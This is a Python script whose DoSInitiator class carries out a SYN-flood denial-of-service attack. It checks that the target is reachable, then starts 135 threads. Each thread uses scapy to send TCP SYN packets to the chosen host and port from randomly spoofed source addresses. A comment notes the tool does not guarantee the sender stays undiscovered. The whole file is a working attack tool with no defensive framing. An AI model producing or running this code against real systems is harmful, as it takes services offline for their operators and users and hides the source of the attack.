import time
import random
import socket
import threading
import scapy.all
from queue import Queue


class DoSInitiator:
    _q = Queue()
    _user_agent_list = None
    _header_data = None
    _total_thread_number = None
    _target_host = ''
    _target_port = None
    _first = True
    _block = 50
    work = True

    def __init__(self):
        self._user_agent_list = [
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 "
            "(.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 "
            "Chrome/16.0.912.63 Safari/535.7",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR "
            "3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        ]
        self._total_thread_number = 135

    def _down_it(self):
        """
        Attack operation here.
        This is a simple implement. It doesn't guarantee you cannot be discovered.

        :return:
        """
        try:
            target = self._target_host
            port = self._target_port

            IP_packet = scapy.all.IP()
            IP_packet.dst = target
            IP_packet.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254),
                                             random.randint(1, 254), random.randint(1, 254))

            TCP_packet = scapy.all.TCP()
            TCP_packet.sport = random.randint(10000, 65535)
            TCP_packet.dport = port
            TCP_packet.flags = 'S'

            scapy.all.send(IP_packet / TCP_packet, verbose=0)

            print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent!--> \033[0m")
        except Exception as e:
            print("\033[91mno connection! server maybe down\033[0m")
            print("\033[91m", e, "\033[0m")
            time.sleep(.1)

    def _thread(self, queue):
        while self.work:
            # Remove one task in the task queue or suspend here
            queue.get()
            self._down_it()
            queue.task_done()

    def _dos(self):
        # Allocate threads
        if self._first:
            for i in range(int(self._total_thread_number)):
                t = threading.Thread(target=self._thread, args=(self._q,))
                t.daemon = True  # if thread is exist, it dies
                t.start()
        self._first = False

        # Add task to the queue
        for i in range(int(self._total_thread_number)):
            for n in range(self._block):
                self._q.put(i)

        while True:
            # Finished all tasks
            if self._q.qsize() == 0:
                return

    def start(self, target_host='', target_port=0):
        self._target_host = target_host
        self._target_port = target_port

        print("\033[92m", self._target_host, " port: ", str(self._target_port),
              " thread number: ", str(self._total_thread_number), "\033[0m")
        time.sleep(2)

        # Check the target
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self._target_host, int(self._target_port)))
            s.settimeout(1)
        except socket.error as e:
            print("\033[91mMaybe the target is not available\033[0m")
            print("\033[91m", e, "\033[0m")
            time.sleep(5)
            return

        self._dos()
